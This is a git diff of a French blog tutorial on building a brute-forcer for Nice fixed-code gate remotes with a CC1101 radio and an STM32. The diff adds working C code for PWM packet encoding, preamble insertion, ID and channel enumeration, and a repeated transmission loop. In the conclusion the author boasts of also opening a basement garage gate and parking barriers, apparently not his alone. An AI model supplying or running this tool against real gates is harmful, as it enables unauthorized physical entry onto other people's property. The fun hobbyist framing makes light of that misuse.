@@ -643,7 +643,7 @@ Pour interagir avec le buffer, il suffit de consulter la liste des commandes str
 
 On observe que **SFTX** et **SFRX** permettent respectivement de vider les buffers **TX** et **RX**.
 
-Pour vérifier l'état du **CC1101**, la documentation recommande de consulter le registre **MARCSTATE**.
+Pour vérifier l'état du CC1101, la documentation recommande de consulter le registre **MARCSTATE**.
 
 ![MARCSTATE](./images/marcstate.png)
 
@@ -653,8 +653,8 @@ Il suffit de remplir le buffer **RX_FIFO** avec les données, puis de lancer la 
 Ensuite, on attend que le buffer se vide en surveillant le registre **MARCSTATE** pour détecter l'état **TX_FIFO_UNDERFLOW**.
 Enfin, il est essentiel de s'assurer que le buffer soit correctement vidé avant la prochaine écriture.
 
-En pratique, le **CC1101** reste en état **TX_FIFO_UNDERFLOW** trop brièvement pour que cet état puisse être lu via le bus SPI.
-En principe, une broche du **CC1101** est dédiée à la détection de cet état, mais je ne l'ai pas connectée à mon microcontrôleur.
+En pratique, le CC1101 reste en état **TX_FIFO_UNDERFLOW** trop brièvement pour que cet état puisse être lu via le bus SPI.
+En principe, une broche du CC1101 est dédiée à la détection de cet état, mais je ne l'ai pas connectée à mon microcontrôleur.
 Ce n'est pas un problème majeur, car on peut simplement vérifier l'état suivant, c'est-à-dire l'état **IDLE**, ce qui garantit que tout fonctionne correctement.
 
 ```c
@@ -682,9 +682,9 @@ static HAL_StatusTypeDef CC1101_SendPacket(CC1101_HandleTypeDef *this,
 
 #### Routine d'initialisation
 
-Enfin, nous définissons une routine d'initialisation pour le **CC1101**.
+Enfin, nous définissons une routine d'initialisation pour le CC1101.
 
-Dans cette routine, nous allons simplement appeler notre fonction d'initialisation, vérifier que le **CC1101** est en état **IDLE** et que les buffers **TX/RX** sont vides.
+Dans cette routine, nous allons simplement appeler notre fonction d'initialisation, vérifier que le CC1101 est en état **IDLE** et que les buffers **TX/RX** sont vides.
 De plus, bien que la documentation indique qu'un reset est effectué automatiquement lors de la mise sous tension du composant, nous allons, par précaution, nous assurer que le composant est bien réinitialisé avant toute interaction.
 
 La documentation fournit la procédure suivante pour une réinitialisation manuelle :
@@ -748,7 +748,7 @@ Avec tout cela, notre driver est complet. Il ne reste plus qu'à l'utiliser.
 ### TI SmartRF Studio
 
 La première étape consiste à configurer correctement le driver.
-Certains d'entre vous ont peut-être été surpris de ne pas avoir vu d'abstraction pour la partie configuration du **CC1101**.
+Certains d'entre vous ont peut-être été surpris de ne pas avoir vu d'abstraction pour la partie configuration du CC1101.
 En effet, la fonction de configuration nécessite de fournir l'intégralité des registres en paramètres. Ne vous inquiétez pas, il y a une raison à cela.
 
 Pour simplifier la configuration de ses produits, Texas Instruments propose un logiciel appelé **SmartRF Studio**.
@@ -762,7 +762,7 @@ On entre ces paramètres dans le logiciel :
 
 ![SmartRFStudio](./images/ti_tool.png)
 
-Le **CC1101** semble capable d'envoyer automatiquement des bits de préambule, mais il est limité à un minimum de 2 bits, alors que nous en souhaitons seulement un.
+Le CC1101 semble capable d'envoyer automatiquement des bits de préambule, mais il est limité à un minimum de 2 bits, alors que nous en souhaitons seulement un.
 Pour contourner cette limitation, nous désactivons le préambule et l'ajouterons manuellement.
 
 De même, le seul encodage supporté est l'encodage Manchester, tandis que nous devons implémenter un encodage PWM manuellement.
@@ -829,4 +829,244 @@ static void* Nice_CC1101RfSettings()
 }
 ```
 
-### Developpement de l'application
+### Développement de l'application
+
+Le plus gros du travail est accompli.
+Maintenant que le code pour notre matériel est terminé, il est temps de passer au développement de la logique de notre bruteforceur.
+
+L'application se divise en trois parties : le transmetteur radio (ici le CC1101), l'implémentation de la télécommande cible (de marque **Nice** dans ce cas), et enfin la génération de paquets.
+Pour cette dernière, je souhaite offrir la possibilité de générer des paquets automatiquement pour le bruteforce, ainsi que de permettre la génération manuelle de paquets.
+
+Nous définissons donc l'interface suivante :
+
+```c
+typedef enum remoteModuleType_e { NICE, REMOTE_MODULE_MAX } remoteModuleType;
+
+typedef enum tranceivers_e { CC1101, TRANCEIVER_MAX } tranceivers;
+
+// Module Interface
+typedef struct remoteModule_s {
+  void (*Destructor)(struct remoteModule_s *);
+  void *(*GetRfSettings)(struct remoteModule_s *);
+  void *(*AutoGeneratePacket)(struct remoteModule_s *, uint32_t, uint8_t *,
+                              size_t);
+  void *(*GeneratePacket)(struct remoteModule_s *, uint32_t *, size_t,
+                          uint8_t *, size_t);
+
+  void *this;
+} remoteModule;
+
+typedef void (*remoteModuleFactory)(remoteModule *, tranceivers);
+
+void InitRemoteModule(remoteModule *, remoteModuleType, tranceivers);
+```
+
+- **GetRfSettings** récupérera les paramètres radio spécifiques à la télécommande cible.
+- **AutoGeneratePacket** permettra de générer automatiquement un paquet pour le bruteforce.
+- **GeneratePacket**, quant à lui, permettra de générer un paquet manuellement.
+
+Il ne reste plus qu'à développer le module qui implémentera la télécommande.
+
+#### Module de ma telecommande Nice
+
+Comme nous l'avons vu lors de l'analyse radio, un paquet de ma télécommande Nice se compose de deux champs : un code identifiant de 10 bits et un champ représentant les 4 canaux disponibles, codé sur 2 bits.
+À cela s'ajoute le type de transmetteur utilisé, ce qui permet de générer les paramètres radio appropriés.
+Pour l'instant, nous n'avons implémenté qu'un seul transmetteur, le CC1101, mais cette structure sera utile si nous souhaitons en ajouter d'autres à l'avenir.
+
+```c
+typedef enum niceField_e { ID, CHANNEL } niceField;
+
+typedef struct niceModule_s {
+  tranceivers tranceiver;
+  uint16_t id;
+  uint8_t channel;
+} niceModule;
+
+void Nice_Init(remoteModule *, tranceivers);
+```
+
+Ensuite, nous implémentons les fonctions du module.
+
+##### GetRfSettings
+
+Nous avons déjà réalisé l'essentiel du travail pour cette fonction avec **Nice_CC1101RfSettings**.
+Pour cette étape, nous faisons simplement appel à **Nice_CC1101RfSettings**, tout en prévoyant la possibilité d'ajouter d'autres transmetteurs à l'avenir, en plus du CC1101.
+
+```c
+void* Nice_GetRfSettings(remoteModule* super)
+{
+	CHECK_OBJ NULL; // Simply check is super is accessible and returns NULL id it isn't.
+
+	static void*(*factory[TRANCEIVER_MAX])() = { Nice_CC1101RfSettings };
+
+	niceModule* this = (niceModule*)(super->this);
+
+	return factory[this->tranceiver]();
+}
+```
+
+##### GeneratePacket
+
+Pour générer un paquet valide, nous devons d'abord compenser les limitations du CC1101, à savoir l'incapacité de générer le bit de préambule et d'encoder le message en PWM.
+
+Pour l'encodage, il suffit de transformer les '1' en '011' et les '0' en '001'.
+
+```c
+#define PWM_TRUE 0b011
+#define PWM_FALSE 0b001
+
+#define SET_BIT_ARRAY(out, index, value)                                       \
+  (out[((index) - ((index) % 8)) / 8] |= (value & 1) << (7 - ((index) % 8)))
+
+static void PWM_Encode(uint8_t *in, uint8_t *out, size_t size_in) {
+  for (size_t i = 0; i < size_in; i++) {
+    for (int8_t b = 0; b < 8; b++) {
+      if (in[i] & (1 << (7 - b))) {
+        SET_BIT_ARRAY(out, (i * 8 + b) * 3, (PWM_TRUE & 0b100) >> 2);
+        SET_BIT_ARRAY(out, (i * 8 + b) * 3 + 1, (PWM_TRUE & 0b010) >> 1);
+        SET_BIT_ARRAY(out, (i * 8 + b) * 3 + 2, (PWM_TRUE & 0b001));
+      } else {
+        SET_BIT_ARRAY(out, (i * 8 + b) * 3, (PWM_FALSE & 0b100) >> 2);
+        SET_BIT_ARRAY(out, (i * 8 + b) * 3 + 1, (PWM_FALSE & 0b010) >> 1);
+        SET_BIT_ARRAY(out, (i * 8 + b) * 3 + 2, (PWM_FALSE & 0b001));
+      }
+    }
+  }
+}
+```
+
+Ensuite, nous ajoutons le bit de préambule.
+
+```c
+static void Nice_ReformatPacket(uint8_t *pwm_data) {
+  uint8_t tmp;
+  uint8_t tmp2;
+
+  // Adding manual 1 bit preamble
+  tmp = pwm_data[0] & 1;
+  pwm_data[0] = (pwm_data[0] >> 1) | (1 << 7);
+  for (uint8_t i = 1; i < NICE_PACKETSIZE; i++) {
+    tmp2 = pwm_data[i] & 1;
+    pwm_data[i] = (pwm_data[i] >> 1) | (tmp << 7);
+    tmp = tmp2;
+  }
+
+  // Triming useless bits
+  pwm_data[4] &= (0xFF << 2);
+}
+```
+
+Enfin, nous plaçons l'identifiant et le canal dans un buffer, sur lequel nous appliquons nos deux fonctions pour obtenir un paquet valide.
+
+```c
+#define NICE_PACKETSIZE 5
+#define PWM_SIZE 3
+
+/* Packet must be  5 bytes long */
+static void Nice_MakePacket(niceModule *this, uint8_t *packet) {
+  uint8_t data[2] = {
+      (uint8_t)(this->id >> 2),
+      (uint8_t)(((this->id & 0b11) << 6) | ((this->channel & 0b11) << 4))};
+  uint8_t data_encode[2 * PWM_SIZE] = {0};
+
+  PWM_Encode(data, data_encode, 2);
+  Nice_ReformatPacket(data_encode);
+
+  for (size_t i = 0; i < NICE_PACKETSIZE; i++)
+    packet[i] = data_encode[i];
+}
+
+static void *Nice_GeneratePacket(remoteModule *super, uint32_t *packet_fields,
+                                 size_t packet_fields_size, uint8_t *packet,
+                                 size_t size) {
+  CHECK_OBJ NULL;
+  if ((packet_fields_size > 2) || (size < NICE_PACKETSIZE))
+    return NULL;
+
+  niceModule *this = (niceModule *)(super->this);
+
+  this->id = (uint16_t)(packet_fields[0]);
+  this->channel = (uint8_t)(packet_fields[1]);
+
+  Nice_MakePacket(this, packet);
+  return packet;
+}
+```
+
+Nous testons avec l'identifiant 01000111011 et le canal 01 :
+
+![Result](./images/result.png)
+
+Voici le résultat : il est satisfaisant et fonctionne parfaitement avec ma porte de garage !
+
+##### Nice_AutoGeneratePacket
+
+Maintenant, nous pouvons automatiser ce processus pour bruteforcer d'autres télécommandes similaires.
+Pour ce faire, il suffit d'incrémenter le champ à bruteforcer jusqu'à ce que la porte s'ouvre.
+
+```c
+static void *Nice_AutoGeneratePacket(remoteModule *super, uint32_t field,
+                                     uint8_t *packet, size_t size) {
+  CHECK_OBJ NULL;
+  if (size < NICE_PACKETSIZE)
+    return NULL;
+
+  niceModule *this = (niceModule *)(super->this);
+
+  if (field == ID) {
+    this->id = (this->id + 1) % NICE_MAX_ID;
+  } else if (field == CHANNEL) {
+    this->channel = (this->channel + 1) % NICE_MAX_CHANNEL;
+  }
+
+  Nice_MakePacket(this, packet);
+  return packet;
+}
+```
+
+Cependant, un petit problème s'est posé : en testant, j'ai constaté que le récepteur du portail nécessite d'entendre le message radio plusieurs fois avant de le détecter correctement.
+Ce phénomène se produit aussi avec ma télécommande, où je dois maintenir le bouton enfoncé pendant quelques secondes avant que la commande soit reconnue.
+
+Nous réglons ce problème en envoyant le message plusieurs fois.
+
+```c
+int main(void) {
+  HAL_Init();
+
+  SystemClock_Config();
+
+  MX_GPIO_Init();
+  MX_SPI2_Init();
+  MX_USB_DEVICE_Init();
+
+  CC1101_HandleTypeDef hcc1101;
+  remoteModule remote;
+  uint8_t packet[NICE_PACKETSIZE];
+
+  InitRemoteModule(&remote, NICE, CC1101);
+  rfSettings *settings = remote.GetRfSettings(&remote);
+  CC1101_Init(&hcc1101, &hspi2, settings);
+  S_FREE(settings);
+
+  niceModule *nice = (niceModule *)(remote.this);
+  /* nice->id = 0b0100011101; */
+  nice->channel = 2;
+
+  uint32_t data[2] = {0b0100011101, 2};
+  while (1) {
+    remote.AutoGeneratePacket(&remote, ID, packet, sizeof(packet));
+    /* remote.GeneratePacket(&remote, data, 2, packet, sizeof(packet)); */
+
+    for (uint32_t i = 0; i < 20; i++) // We have to send the message mutliple time for it to be detected
+      hcc1101.SendPacket(&hcc1101, packet, NICE_PACKETSIZE);
+  }
+}
+```
+
+# Conclusion
+
+Me voici donc chez moi, à 23h30, assis à côté de mon portail pour tester le bruteforce de son identifiant. Après seulement deux minutes d'attente, mon portail s'ouvre !
+
+En bonus, le bruteforce du canal m'a permis d'ouvrir le portail de mon garage en sous-sol ainsi que les barrières du parking devant chez moi. :p
+
+J'espère que cet article vous aura appris quelques choses et vous aura donné envie d'explorer davantage ce qu'il est possible de réaliser avec des microcontrôleurs à des prix très abordables !
